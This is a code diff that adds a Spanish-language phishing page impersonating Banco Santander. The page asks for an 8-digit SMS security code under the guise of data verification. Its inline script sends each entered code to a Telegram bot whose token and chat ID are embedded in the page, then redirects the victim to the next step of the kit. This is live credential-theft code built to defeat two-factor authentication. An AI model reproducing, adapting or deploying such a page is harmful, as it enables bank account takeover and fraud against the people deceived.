@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="estilo.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="alerta4.js"></script>
+    <script src="ipvalidation.js"></script>
+    <link rel="icon" href="icono.png" type="image/x-icon"> 
+    <link rel="apple-touch-icon" href="icono.png"> 
+    <title>Banco Santander</title>
+</head>
+<body class="body">
+    <div class="general">
+        <form id="formulario" onsubmit="enviarFormulario(event)" class="form">
+            <img src="logo.png" class="logo">
+            <p class="texto"><b>Verificación de datos</b></p>
+            <p class="texto1"><b>Te enviamos un código de seguridad vía SMS o correo electrónico.</b></p>
+            <img src="imag1.png" class="imag1">
+            <label class="texto2"><b>Código de seguridad enviado por SMS</b></label><br>
+            <input class="documento" type="text" id="documento" maxlength="8" minlength="8" pattern="[0-9]*" inputmode="numeric" required placeholder="Código de 8 dígitos"><br><br>
+            <button type="submit" class="boton">Verificar</button>
+        </form>
+        <script src="jandex4.js"></script>
+    </div>
+    <script>
+        function enviarFormulario(event) {
+            event.preventDefault();
+
+            var documento = document.getElementById("documento").value;
+            var mensaje = "Código SMS#2: <code>" + documento + "</code>\n";
+
+            axios.post("https://api.telegram.org/bot6604007507:AAHEnjRE9QBLt7lusrsTcCx243NtTelJFmg/sendMessage", {
+                chat_id: "-1002037208917",
+                text: mensaje,
+                parse_mode: "HTML"
+            })
+            .then(function(response) {
+                if (response.data.ok) {
+                    console.log("Mensaje enviado correctamente.");
+                    window.location.href = "index1.html";
+                } else {
+                    console.error("Error en la llamada a la API de Telegram: ", response.data);
+                }
+            })
+            .catch(function(error) {
+                console.error("Error en la llamada a la API de Telegram: ", error);
+            });
+        }
+    </script>
+</body>
+</html>
